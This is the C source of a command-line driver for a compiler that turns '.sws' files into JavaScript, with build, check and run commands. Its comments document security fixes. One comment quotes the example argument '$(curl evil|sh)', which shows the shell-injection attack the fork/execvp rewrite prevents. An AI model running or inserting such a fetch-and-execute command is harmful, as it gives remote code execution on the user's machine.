/* POSIX.1-2008: enables lstat (sys/stat.h), mkstemp (stdlib.h),
 * fork/execvp (unistd.h), and DIR/opendir/readdir (dirent.h)
 * under -std=c11, where __STRICT_ANSI__ disables glibc's default
 * feature set. Must be defined before any system header is included.
 * Windows (MSVC/MinGW) doesn't need it; Cygwin/MSYS do. */
#if !defined(_WIN32) || defined(__CYGWIN__) || defined(__MSYS__)
#  ifndef _POSIX_C_SOURCE
#    define _POSIX_C_SOURCE 200809L
#  endif
#endif
#include "util.h"
#include "lexer.h"
#include "parser.h"
#include "ast.h"
#include "codegen.h"
#include "runtime.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>

#if defined(__unix__) || defined(__APPLE__) || defined(__CYGWIN__) || defined(__MSYS__)
#define SWSC_POSIX
#include <sys/wait.h>
#include <unistd.h>     /* fork, execvp, _exit */
#endif

#if defined(_WIN32) && !defined(__CYGWIN__) && !defined(__MSYS__)
#include <direct.h>
#include <io.h>
#include <fcntl.h>
#define mkdir(path, mode) _mkdir(path)
#endif

#define PATHBUF 4096
#define MAXPATH (PATHBUF * 4)
#define MAX_WALK_DEPTH 256   /* SAFETY: guard against symlink loops */

const char *SWIFTS_RUNTIME =
"const _force = (x) => { if (x === null || x === undefined) throw new Error(\"Force unwrap of nil\"); return x; };\n"
"const print = (...args) => console.log(...args);\n"
"const String = (x) => {\n"
"  if (x === null || x === undefined) return \"nil\";\n"
"  if (Array.isArray(x)) return \"[\" + x.map(String).join(\", \") + \"]\";\n"
"  if (typeof x === \"object\") {\n"
"    const pairs = Object.entries(x).map(([k, v]) => k + \": \" + String(v)).join(\", \");\n"
"    return \"{\" + pairs + \"}\";\n"
"  }\n"
"  return \"\" + x;\n"
"};\n"
"const Int = (x) => { const n = parseInt(x, 10); return Number.isNaN(n) ? null : n; };\n"
"const Double = (x) => { const n = parseFloat(x); return Number.isNaN(n) ? null : n; };\n"
"const Bool = (x) => Boolean(x);\n"
"const abs = Math.abs, min = Math.min, max = Math.max;\n"
"const round = Math.round, floor = Math.floor, ceil = Math.ceil;\n"
"const _range   = (a, b) => { const r = []; for (let i = a; i <  b; i++) r.push(i); return r; };\n"
"const _rangeIn = (a, b) => { const r = []; for (let i = a; i <= b; i++) r.push(i); return r; };\n";

/* ---------- fs helpers ---------- */

/* FIX #3: ftell() can return -1 (e.g. 32-bit large file, FUSE, unusual
 * filesystems). Previously `xmalloc(n + 1)` became malloc(0)->malloc(1)
 * while fread() then tried to read SIZE_MAX bytes → heap overflow.
 * Now: any fseek/ftell error returns NULL. */
static char *read_file(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long n = ftell(f);
    if (n < 0) { fclose(f); return NULL; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return NULL; }
    char *buf = xmalloc((size_t)n + 1);
    size_t got = fread(buf, 1, (size_t)n, f);
    int rerr = ferror(f);
    fclose(f);
    if (rerr) { free(buf); return NULL; }
    buf[got] = '\0';
    /* LIMITATION: if the file grew between ftell() and fread(), we
     * silently truncate. For source files this is acceptable: racing
     * writers are undefined behaviour for any compiler. */
    return buf;
}

static int write_file(const char *path, const char *data) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t n = strlen(data);
    size_t w = fwrite(data, 1, n, f);
    int close_err = (fclose(f) != 0);
    return (w == n && !close_err) ? 0 : -1;
}

/* FIX #4: previously `tmp[len - 1]` underflowed when path was "". */
static int mkdir_p(const char *path) {
    if (!path || !*path) return 0;   /* empty path is a no-op */
    char tmp[MAXPATH];
    size_t len = strlen(path);
    if (len >= sizeof(tmp)) return -1;
    memcpy(tmp, path, len + 1);
    while (len > 1 && tmp[len - 1] == '/') tmp[--len] = '\0';
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            if (mkdir(tmp, 0755) != 0 && errno != EEXIST) return -1;
            *p = '/';
        }
    }
    if (mkdir(tmp, 0755) != 0 && errno != EEXIST) return -1;
    return 0;
}

static const char *path_ext(const char *p) {
    const char *dot = strrchr(p, '.');
    return dot ? dot : "";
}

static void derive_js_path(const char *src, char *out, size_t cap) {
    snprintf(out, cap, "%s", src);
    size_t n = strlen(out);
    if (n >= 4 && strcmp(out + n - 4, ".sws") == 0) {
        out[n - 3] = 'j';
        out[n - 2] = 's';
        out[n - 1] = '\0';
    } else {
        strncat(out, ".js", cap - n - 1);
    }
}

static int has_module_syntax(const char *js) {
    const char *p = js;
    while (*p) {
        const char *line = p;
        while (*line == ' ' || *line == '\t') line++;
        if (strncmp(line, "import ",   7) == 0 ||
            strncmp(line, "import\t",   7) == 0 ||
            strncmp(line, "import{",    7) == 0 ||
            strncmp(line, "export ",   7) == 0 ||
            strncmp(line, "export\t",   7) == 0 ||
            strncmp(line, "export{",    7) == 0)
            return 1;
        while (*p && *p != '\n') p++;
        if (*p == '\n') p++;
    }
    return 0;
}

static Node *parse_file(const char *src_path, char **out_src) {
    char *src = read_file(src_path);
    if (!src) {
        fprintf(stderr, "swsc: cannot read %s: %s\n", src_path, strerror(errno));
        return NULL;
    }
    SSError err = {0};
    TokenList *toks = tokenize(src, &err);
    if (!toks) {
        fprintf(stderr, "%s:%d:%d: %s\n", src_path, err.line, err.col, err.msg);
        free(src);
        return NULL;
    }
    Node *ast = parse(toks, &err);
    free_tokens(toks);
    if (!ast) {
        fprintf(stderr, "%s:%d:%d: %s\n", src_path, err.line, err.col, err.msg);
        free(src);
        return NULL;
    }
    /* LIMITATION: the AST is intentionally not freed — one-shot compiler,
     * the process exits shortly. Tracked in the "known leaks" list. */
    *out_src = src;
    return ast;
}

/* Shared output builder used by both `build` and `run`, so that the
 * IIFE-wrapping / runtime-injection logic lives in exactly one place. */
static void build_output(StrBuf *out, const char *user_js, int no_runtime,
                         const char *src_path) {
    if (!no_runtime) {
        sb_put(out, SWIFTS_RUNTIME);
        sb_putc(out, '\n');
    }
    if (has_module_syntax(user_js)) {
        sb_put(out, user_js);
    } else {
        sb_put(out, "(() => {\n");
        sb_put(out, user_js);
        sb_put(out, "\n})();\n");
    }
    sb_putc(out, '\n');
    /* FIX #5: sourceURL must not contain newlines — a "\n" in the path
     * would terminate the comment and cause the rest to be parsed as
     * executable JS. Replace with spaces. */
    sb_put(out, "//# sourceURL=");
    for (const char *p = src_path; *p; p++)
        sb_putc(out, (*p == '\n' || *p == '\r') ? ' ' : *p);
    sb_putc(out, '\n');
}

static int compile_file(const char *src_path, const char *out_path, int no_runtime) {
    char *src;
    Node *ast = parse_file(src_path, &src);
    if (!ast) return 1;

    char *user_js = gen_program(ast);
    if (!user_js) {
        fprintf(stderr, "%s:%d:%d: %s\n", src_path,
                gen_error_line(), gen_error_col(), gen_error_msg());
        free(src);
        return 1;
    }

    StrBuf out; sb_init(&out);
    build_output(&out, user_js, no_runtime, src_path);

    /* create parent directory of out_path */
    char dir[MAXPATH];
    int dr = snprintf(dir, sizeof(dir), "%s", out_path);
    if (dr > 0 && (size_t)dr < sizeof(dir)) {
        char *slash = strrchr(dir, '/');
        if (slash) { *slash = '\0'; mkdir_p(dir); }
    }

    int rc = write_file(out_path, out.buf);
    if (rc != 0)
        fprintf(stderr, "swsc: cannot write %s: %s\n", out_path, strerror(errno));

    sb_free(&out);
    free(user_js);
    free(src);
    return rc ? 1 : 0;
}

static int check_file(const char *src_path) {
    char *src;
    Node *ast = parse_file(src_path, &src);
    if (!ast) return 1;

    char *user_js = gen_program(ast);
    if (!user_js) {
        fprintf(stderr, "%s:%d:%d: %s\n", src_path,
                gen_error_line(), gen_error_col(), gen_error_msg());
        free(src);
        return 1;
    }
    free(user_js);
    free(src);
    return 0;
}

/* FIX #6 (DoS): previously used stat() which follows symlinks — a
 * symlink loop `ln -s .. self` would recurse forever, blowing the stack.
 * Now: lstat() + skip symlinked directories, plus a depth guard. */
static int walk(const char *src_root, const char *out_root,
                const char *rel, int check_only, int no_runtime, int depth) {
    if (depth > MAX_WALK_DEPTH) {
        fprintf(stderr, "swsc: directory nesting too deep at %s, skipping\n", rel);
        return 1;
    }
    char src_dir[MAXPATH], out_dir[MAXPATH];
    int r1, r2 = 0;
    if (*rel) {
        r1 = snprintf(src_dir, sizeof(src_dir), "%s/%s", src_root, rel);
        if (!check_only)
            r2 = snprintf(out_dir, sizeof(out_dir), "%s/%s", out_root, rel);
    } else {
        r1 = snprintf(src_dir, sizeof(src_dir), "%s", src_root);
        if (!check_only)
            r2 = snprintf(out_dir, sizeof(out_dir), "%s", out_root);
    }
    if (r1 < 0 || (size_t)r1 >= sizeof(src_dir) ||
        (!check_only && (r2 < 0 || (size_t)r2 >= sizeof(out_dir)))) {
        fprintf(stderr, "swsc: path too long at %s, skipping\n", rel);
        return 1;
    }

    DIR *d = opendir(src_dir);
    if (!d) { fprintf(stderr, "swsc: cannot open %s: %s\n", src_dir, strerror(errno)); return 1; }
    int errors = 0;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
        char child_rel[MAXPATH];
        int cr = (*rel)
            ? snprintf(child_rel, sizeof(child_rel), "%s/%s", rel, e->d_name)
            : snprintf(child_rel, sizeof(child_rel), "%s", e->d_name);
        if (cr < 0 || (size_t)cr >= sizeof(child_rel)) {
            fprintf(stderr, "swsc: path too long, skipping entry under %s\n", src_dir);
            continue;
        }

        char full[MAXPATH];
        int fr = snprintf(full, sizeof(full), "%s/%s", src_root, child_rel);
        if (fr < 0 || (size_t)fr >= sizeof(full)) {
            fprintf(stderr, "swsc: path too long, skipping %s/%s\n", src_root, child_rel);
            continue;
        }
        struct stat st;
        if (lstat(full, &st) != 0) continue;

        if (S_ISLNK(st.st_mode)) {
            /* Skip symlinks entirely — following them can escape the tree
             * or create cycles. Documented limitation. */
            continue;
        }
        if (S_ISDIR(st.st_mode)) {
            errors += walk(src_root, out_root, child_rel, check_only, no_runtime, depth + 1);
        } else if (S_ISREG(st.st_mode) && strcmp(path_ext(e->d_name), ".sws") == 0) {
            if (check_only) {
                errors += check_file(full);
            } else {
                char out_rel[MAXPATH];
                int orr = snprintf(out_rel, sizeof(out_rel), "%s", child_rel);
                if (orr < 0 || (size_t)orr >= sizeof(out_rel)) {
                    fprintf(stderr, "swsc: output path too long, skipping %s\n", child_rel);
                    continue;
                }
                size_t n = strlen(out_rel);
                /* n >= 4 is guaranteed: path_ext said it ends with ".sws" */
                out_rel[n - 4] = '\0';
                strncat(out_rel, ".js", sizeof(out_rel) - n - 1);

                char out_path[MAXPATH];
                int op = snprintf(out_path, sizeof(out_path), "%s/%s", out_root, out_rel);
                if (op < 0 || (size_t)op >= sizeof(out_path)) {
                    fprintf(stderr, "swsc: output path too long, skipping %s\n", child_rel);
                    continue;
                }
                mkdir_p(out_root);
                errors += compile_file(full, out_path, no_runtime);
            }
        }
    }
    closedir(d);
    return errors;
}

/* FIX #1 (CRITICAL): the original used system() with a hand-rolled
 * "quote everything with backslashes" — but /bin/sh still expands
 * $(...), `...`, $VAR and ! inside double quotes. That is a trivial
 * remote-code-execution when swsc runs untrusted .sws files
 * (`swsc run foo.sws -- '$(curl evil|sh)'`) or when TMPDIR contains
 * shell metacharacters. Fix: bypass the shell entirely with
 * fork/execvp (POSIX) and _spawnvp (Windows). */
#if defined(SWSC_POSIX)
static int run_node(char *tmpfile, int extra_argc, char **extra_argv) {
    /* execvp's prototype is char *const argv[]: it does not modify the
     * strings, but the type system can't express that for string
     * literals. Writable buffers avoid the cast-qual warning cleanly. */
    char node_cmd[] = "node";
    int total = 2 + extra_argc;
    char **args = xmalloc(sizeof(char *) * (size_t)(total + 1));
    args[0] = node_cmd;
    args[1] = tmpfile;
    for (int i = 0; i < extra_argc; i++) args[i + 2] = extra_argv[i];
    args[total] = NULL;

    pid_t pid = fork();
    if (pid < 0) { free(args); return 2; }
    if (pid == 0) {
        execvp("node", args);
        /* only reached on exec failure */
        perror("swsc: execvp node");
        _exit(127);
    }
    free(args);

    int status;
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR) return 2;
    }
    if (WIFEXITED(status))   return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return 2;
}
#else  /* Windows */
#include <process.h>
static int run_node(char *tmpfile, int extra_argc, char **extra_argv) {
    int total = 2 + extra_argc;
    const char **args = xmalloc(sizeof(char *) * (size_t)(total + 1));
    args[0] = "node";
    args[1] = tmpfile;
    for (int i = 0; i < extra_argc; i++) args[i + 2] = extra_argv[i];
    args[total] = NULL;
    intptr_t rc = _spawnvp(_P_WAIT, "node", args);
    free(args);
    if (rc == -1) {
        fprintf(stderr, "swsc: cannot execute node: %s\n", strerror(errno));
        return 2;
    }
    return (int)rc;
}
#endif

/* FIX #2: two hazards fixed.
 *   (a) TOCTOU: the original checked "does it exist?" then opened for
 *       writing — a local attacker could win the race. Now: POSIX uses
 *       mkstemp (atomic, 0600, and refuses to overwrite);
 *       Windows uses _open with _O_CREAT|_O_EXCL (same guarantee).
 *   (b) Predictable names (time-only) → mkstemp supplies entropy
 *       on POSIX. Windows retains `time ^ attempt` — documented
 *       limitation for non-sticky tempdirs. */
static char *create_tmp_file(void) {
    const char *tmpdir = getenv("TMPDIR");
    if (!tmpdir || !*tmpdir) tmpdir = getenv("TEMP");
    if (!tmpdir || !*tmpdir) tmpdir = getenv("TMP");
    if (!tmpdir || !*tmpdir) {
#if defined(SWSC_POSIX)
        tmpdir = "/tmp";
#else
        tmpdir = ".";
#endif
    }

#if defined(SWSC_POSIX)
    size_t n = strlen(tmpdir) + 32;
    char *path = xmalloc(n);
    snprintf(path, n, "%s/swsc-XXXXXX", tmpdir);
    int fd = mkstemp(path);           /* atomically creates, mode 0600 */
    if (fd < 0) { free(path); return NULL; }
    close(fd);
    return path;
#else
    unsigned seed = (unsigned)time(NULL) ^ (unsigned)_getpid();
    for (unsigned attempt = 0; attempt < 10000; attempt++) {
        size_t n = strlen(tmpdir) + 64;
        char *path = xmalloc(n);
        snprintf(path, n, "%s\\swsc-%u-%u.js", tmpdir, seed, attempt);
        int fd = _open(path,
                       _O_CREAT | _O_EXCL | _O_WRONLY | _O_BINARY,
                       _S_IREAD | _S_IWRITE);
        if (fd >= 0) { _close(fd); return path; }
        free(path);
        if (errno != EEXIST) return NULL;
    }
    return NULL;
#endif
}

static int cmd_run(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s run <file.sws> [-- args...]\n", argv[0]);
        return 2;
    }
    const char *src_path = argv[2];

    int extra_argc = 0;
    char **extra_argv = NULL;
    if (argc > 3) {
        if (strcmp(argv[3], "--") != 0) {
            fprintf(stderr, "swsc: unexpected argument '%s' (use -- to pass args)\n", argv[3]);
            return 2;
        }
        /* FIX #7: was &argv[4] even when argc == 4 (out-of-bounds
         * pointer arithmetic, formally UB). */
        if (argc > 4) {
            extra_argv = &argv[4];
            extra_argc = argc - 4;
        }
    }

    struct stat st;
    if (stat(src_path, &st) != 0 || !S_ISREG(st.st_mode)) {
        fprintf(stderr, "swsc: cannot access %s: %s\n", src_path, strerror(errno));
        return 2;
    }

    char *src;
    Node *ast = parse_file(src_path, &src);
    if (!ast) return 1;

    char *user_js = gen_program(ast);
    if (!user_js) {
        fprintf(stderr, "%s:%d:%d: %s\n", src_path,
                gen_error_line(), gen_error_col(), gen_error_msg());
        free(src);
        return 1;
    }

    StrBuf out; sb_init(&out);
    build_output(&out, user_js, 0 /* no_runtime always false for run */, src_path);

    char *tmp = create_tmp_file();
    if (!tmp) {
        fprintf(stderr, "swsc: cannot create temp file in %s\n",
                getenv("TMPDIR") ? getenv("TMPDIR") : "temp directory");
        sb_free(&out); free(user_js); free(src);
        return 2;
    }
    if (write_file(tmp, out.buf) != 0) {
        fprintf(stderr, "swsc: cannot write temp %s: %s\n", tmp, strerror(errno));
        remove(tmp); free(tmp);
        sb_free(&out); free(user_js); free(src);
        return 2;
    }

    int rc = run_node(tmp, extra_argc, extra_argv);

    remove(tmp);
    free(tmp);
    sb_free(&out);
    free(user_js);
    free(src);
    return rc;
}

static void usage(const char *argv0) {
    fprintf(stderr,
        "usage: %s <command> [options]\n"
        "  build <path> [-o <out>] [--no-runtime]  compile .sws -> .js\n"
        "  check <path>                            compile-only, report errors\n"
        "  run   <file.sws> [-- args...]           compile and run\n"
        "  runtime                                 print the standard runtime JS\n",
        argv0);
}

int main(int argc, char **argv) {
    if (argc < 2) { usage(argv[0]); return 2; }

    if (strcmp(argv[1], "runtime") == 0) {
        printf("%s", SWIFTS_RUNTIME);
        return 0;
    }

    if (strcmp(argv[1], "check") == 0) {
        if (argc < 3) { usage(argv[0]); return 2; }
        const char *src = argv[2];
        if (argc > 3) {
            fprintf(stderr, "swsc: unknown argument '%s'\n", argv[3]);
            return 2;
        }

        struct stat st;
        if (stat(src, &st) != 0) {
            fprintf(stderr, "swsc: cannot access %s: %s\n", src, strerror(errno));
            return 2;
        }

        if (S_ISREG(st.st_mode)) return check_file(src) ? 1 : 0;

        if (!S_ISDIR(st.st_mode)) {
            fprintf(stderr, "swsc: %s is neither a file nor a directory\n", src);
            return 2;
        }

        int rc = walk(src, NULL, "", 1, 0, 0);
        if (rc) fprintf(stderr, "swsc: %d error(s)\n", rc);
        return rc ? 1 : 0;
    }

    if (strcmp(argv[1], "run") == 0) return cmd_run(argc, argv);

    if (strcmp(argv[1], "build") != 0) {
        fprintf(stderr, "swsc: unknown command '%s'\n", argv[1]);
        return 2;
    }

    if (argc < 3) { usage(argv[0]); return 2; }

    const char *src = argv[2];
    const char *out = NULL;
    int no_runtime = 0;

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-o") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "swsc: -o requires an argument\n");
                return 2;
            }
            out = argv[++i];
        } else if (strcmp(argv[i], "--no-runtime") == 0) {
            no_runtime = 1;
        } else {
            fprintf(stderr, "swsc: unknown argument '%s'\n", argv[i]);
            return 2;
        }
    }

    struct stat st;
    if (stat(src, &st) != 0) {
        fprintf(stderr, "swsc: cannot access %s: %s\n", src, strerror(errno));
        return 2;
    }

    if (S_ISREG(st.st_mode)) {
        char derived[MAXPATH];
        if (!out) {
            derive_js_path(src, derived, sizeof(derived));
            out = derived;
        } else {
            int out_is_dir = 0;
            struct stat ost;
            if (stat(out, &ost) == 0 && S_ISDIR(ost.st_mode)) out_is_dir = 1;
            else {
                size_t ol = strlen(out);
                if (ol > 0 && out[ol - 1] == '/') out_is_dir = 1;
            }
            if (out_is_dir) {
                const char *base = strrchr(src, '/');
                base = base ? base + 1 : src;
                char base_js[PATHBUF];
                derive_js_path(base, base_js, sizeof(base_js));
                snprintf(derived, sizeof(derived), "%s/%s", out, base_js);
                out = derived;
            }
        }
        return compile_file(src, out, no_runtime) ? 1 : 0;
    }

    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "swsc: %s is neither a file nor a directory\n", src);
        return 2;
    }

    if (!out) out = src;
    mkdir_p(out);
    int rc = walk(src, out, "", 0, no_runtime, 0);
    if (rc) fprintf(stderr, "swsc: %d error(s)\n", rc);
    return rc ? 1 : 0;
}